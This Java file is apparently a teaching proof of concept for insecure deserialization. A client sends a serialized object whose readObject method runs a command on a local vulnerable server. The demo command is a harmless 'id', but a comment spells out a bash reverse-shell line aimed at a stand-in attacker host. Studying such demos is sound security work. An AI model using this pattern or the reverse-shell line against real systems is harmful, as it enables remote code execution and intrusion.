/**
 * AttackClient.java
 *
 * Sends a serialized RemoteCommand payload to VulnerableServer.
 * Demonstrates how an attacker controls deserialized object content.
 *
 * In a real attack, 'command' would be a reverse shell or malware dropper.
 * Here it runs 'id' (harmless) to prove execution.
 *
 * Compile:  javac AttackClient.java
 * Run:      java AttackClient
 */

import java.io.*;
import java.net.*;
import java.lang.reflect.*;

public class AttackClient {

    // Must match the server's inner class structure for this demo
    // In real attacks, ysoserial generates gadget chains from existing classpath classes
    static class RemoteCommand implements Serializable {
        private static final long serialVersionUID = 1L;
        private String command;

        RemoteCommand(String command) {
            this.command = command;
        }

        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            ois.defaultReadObject();
            System.out.println("[ATTACKER PAYLOAD] Executing: " + command);
            Runtime.getRuntime().exec(command);
        }
    }

    public static void main(String[] args) throws Exception {
        String host = "localhost";
        int port = 9999;

        // Attacker-controlled command — in real attacks: "bash -i >& /dev/tcp/attacker/4444 0>&1"
        String maliciousCommand = "id";

        System.out.println("[ATTACKER] Sending malicious serialized payload to " + host + ":" + port);

        try (Socket socket = new Socket(host, port);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {

            RemoteCommand payload = new RemoteCommand(maliciousCommand);
            oos.writeObject(payload);
            oos.flush();

            System.out.println("[ATTACKER] Payload sent. Check server output for command execution.");
        }
    }
}
